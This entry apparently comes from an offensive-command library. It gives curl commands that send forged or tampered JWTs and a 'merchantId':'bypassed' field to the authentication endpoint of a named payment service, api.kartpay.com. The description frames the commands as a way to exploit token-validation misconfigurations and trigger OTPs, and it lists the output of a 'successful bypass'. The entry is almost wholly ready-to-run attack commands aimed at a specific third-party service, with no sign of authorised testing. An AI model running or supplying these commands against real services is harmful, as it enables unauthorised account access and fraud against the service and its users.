---
id: c1d2e3f4-g5h6-7891-defg-4567890123
data: >-
  curl -X POST https://api.kartpay.com/auth -H "Authorization: Bearer
  $JWT_TOKEN" -d '{"phone":"$PHONE"}'
tags:
  - api-testing
  - jwt
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T12:00:00Z'
updated_at: '2025-12-14T17:24:39.822Z'
verified: false
validated: true
submitted: true
---
# curl-modify-jwt

## Command

```bash
curl -X POST https://api.kartpay.com/auth -H "Authorization: Bearer $JWT_TOKEN" -d '{"phone":"$PHONE"}'
```

## Description

This command tests JWT authentication by sending a POST request to an auth endpoint with a modifiable Bearer token, useful for exploiting misconfigurations in token validation.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | Specifies the HTTP method | Yes |
| `-H "Authorization: Bearer $JWT_TOKEN"` | Sets the JWT in the header; modify $JWT_TOKEN externally | Yes |
| `-d '{"phone":"$PHONE"}'` | JSON payload with phone for OTP trigger; replace $PHONE | Yes |

## Examples

### Basic Usage

```bash
curl -X POST https://api.kartpay.com/auth -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJtZXJjaGFudElkIjoiMDAwIn0.invalid" -d '{"phone":"+1234567890"}'
```

### Advanced Usage

```bash
curl -X POST https://api.kartpay.com/auth -H "Authorization: Bearer modified_jwt" -H "Content-Type: application/json" -d '{"phone":"+1234567890", "merchantId":"bypassed"}'
```

## Expected Output

Successful bypass returns JSON like {"token": "new_access_token", "status": "success"}; failure shows 401 Unauthorized.

## Related

- [[Related Procedure: Exploit-JWT-Merchant-ID-Misconfiguration]]
